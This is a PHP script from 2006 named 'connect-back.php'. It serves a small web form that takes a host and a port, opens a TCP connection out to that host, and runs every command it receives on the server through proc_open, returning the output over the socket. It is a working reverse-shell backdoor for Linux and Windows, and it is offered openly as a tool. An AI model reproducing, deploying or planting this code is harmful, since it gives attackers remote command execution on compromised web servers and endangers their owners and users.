<?php
/*
* 文件说明
* Copyright (c) 2006, By Maple-X http://www.Wolvez.org
* All rights reserved
* Author：Maple-X ( Maple-x@163.com )
* Date：2006-07-16
* $Id: connect-back.php,v 1.0 2006/07/16 14:27:01 Maple-X Exp $
*/
if(isset($_POST['host']) && isset($_POST['port']))
{
   $host = $_POST['host'];
   $port = $_POST['port'];
}else{    
print<<<eof
<html>
<head>
<title>PHP Connect Back</title>
<p>Code By Maple-x <br>
<a href="http://www.wolvez.org">http://www.Wolvez.org<a>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</title>
<style>
body{
   margin:0;
   padding:0;
   background:#000000;
   text-align:center;
   color:green;
   FONT-FAMILY: verdana;
   FONT-SIZE: 14px;
}
input{
   margin:0px;
   padding:0px;
   color:green;
   border: 1px;
   border-bottom-color:#ffffff;
}
A:link {
       color:green;
     TEXT-DECORATION: none
}
A:visited {
       COLOR: #00ff00;
     TEXT-DECORATION: none
}
A:active {
     TEXT-DECORATION: none
}
A:hover {
     COLOR: #00ff00; TEXT-DECORATION: none
}
</head>
</style>
<body>
<form method=post action="">
Host:<input type=text name=host><br />
Port: <input type=text name=port><br />
     <input type=radio name=info check=checked value=linux>Linux
     <input type=radio name=info value=win>Win<br />
     <input type=submit name=submit value="反弹连接">
</form>
</body>
</html>
eof;
print("-------------------------------------------------------------")."<br />";
print("注意:win的反弹需要PHP支持socket")."<br />";
print("         Linux在非源码编译安装的情况一般都会支持,具体查看phpinfo()")."<br />";
print("         错误信息:win保存在当目录的log.txt,Linux为/tmp/log.txt")."<br />";
die("欢迎测试");
}
if($_POST['info']=="win")
{
   $env=array('path' => 'c:\\windows\\system32');
   $descriptorspec = array(
       0 => array("pipe","r"),
       1 => array("pipe","w"),
       2 => array("file","log.txt","a"),
);
}else{
   $env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
   $descriptorspec = array(
       0 => array("pipe","r"),
       1 => array("pipe","w"),
       2 => array("file","/tmp/log.txt","a"),
       );
}
$host=gethostbyname($host);
$proto=getprotobyname("tcp");
if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0)
{
   die("Socket Create Faile");
}
if(($ret=socket_connect($sock,$host,$port))<0)
{
   die("Connect Faile");
}else{
$message="----------------------PHP Connect-Back--------------------\n";
$message.="-----------------------Code By Maple-x--------------------\n";
socket_write($sock,$message,strlen($message));
$cwd=str_replace('\\','/',dirname(__FILE__));
while($cmd=socket_read($sock,65535,$proto))
   {
   if(trim(strtolower($cmd))=="exit")
   {
   socket_write($sock,"Bye Bye\n");
   exit;
   }else{
      
$process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
   fwrite($pipes[0], $cmd);
   fclose($pipes[0]);
  
   $msg=stream_get_contents($pipes[1]);
   socket_write($sock,$msg,strlen($msg));
   fclose($pipes[1]);
   $return_value = proc_close($process);
}
   }
}
}
?>